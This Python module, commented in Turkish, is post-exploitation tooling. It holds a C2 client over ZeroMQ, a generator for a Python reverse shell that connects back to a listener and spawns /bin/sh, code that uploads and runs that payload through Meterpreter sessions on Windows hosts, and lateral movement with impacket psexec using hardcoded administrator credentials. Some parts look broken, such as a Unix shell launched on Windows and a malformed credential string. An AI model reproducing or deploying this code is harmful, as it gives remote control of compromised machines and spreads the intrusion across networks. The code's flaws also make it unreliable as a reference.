# cybermodules/decentralized.py
import logging
import zmq
import threading
import time
import subprocess
import os
from cybermodules.autoexploit import AutoExploitEngine

logger = logging.getLogger(__name__)

class DistributedAgent:
    def __init__(self, agent_id, c2_host, c2_port=5555):
        self.agent_id = agent_id
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.context = zmq.Context()
        self.socket = self.context.socket(zmq.REQ)
        self.socket.connect(f"tcp://{c2_host}:{c2_port}")

    def send_command(self, command):
        self.socket.send_string(command)
        response = self.socket.recv_string()
        return response

class AgentDeployer:
    def __init__(self, scan_id, lhost, lport=4444):
        self.scan_id = scan_id
        self.lhost = lhost
        self.lport = lport
        self.deployed_agents = []

    def generate_agent_payload(self):
        """Basit Python reverse shell agent üret"""
        payload = f"""
import socket, subprocess, os
s = socket.socket()
s.connect(('{self.lhost}', {self.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"""
        payload_path = f"/tmp/agent_{self.scan_id}.py"
        with open(payload_path, "w") as f:
            f.write(payload)
        return payload_path

    def deploy_to_session(self, session_id):
        """Meterpreter session'a agent yükle ve çalıştır"""
        engine = AutoExploitEngine()
        if not engine.client:
            return False

        try:
            session = engine.client.sessions.session(session_id)
            payload_path = self.generate_agent_payload()
            
            # Payload'ı upload et
            with open(payload_path, "rb") as f:
                payload_data = f.read()
            session.write(f'upload {payload_path} C:\\Windows\\Temp\\agent.py\n')
            time.sleep(3)
            session.read()  # upload output

            # Çalıştır
            session.write('execute -f python.exe -a "C:\\Windows\\Temp\\agent.py"\n')
            time.sleep(2)
            output = session.read()
            logger.info(f"[DISTRIBUTED] Agent deployed on session {session_id}")
            self.deployed_agents.append(session_id)
            os.unlink(payload_path)
            return True
        except Exception as e:
            logger.error(f"[DISTRIBUTED DEPLOY ERROR] {str(e)}")
            return False

    def pivot_and_deploy(self, target_ips):
        """Kırılan pass veya pivot ile yeni host'lara agent yükle (impacket ile)"""
        # Basit örnek: impacket psexec ile
        try:
            from impacket.examples.psexec import Psexec
            for ip in target_ips:
                # Kullanıcı/pass DB'den çekilebilir, örnek için sabit
                psexec = Psexec(f"administrator@password@{ip}")
                psexec.run()
                logger.info(f"[PIVOT DEPLOY] Agent attempted on {ip}")
        except Exception as e:
            logger.error(f"[PIVOT ERROR] {str(e)}")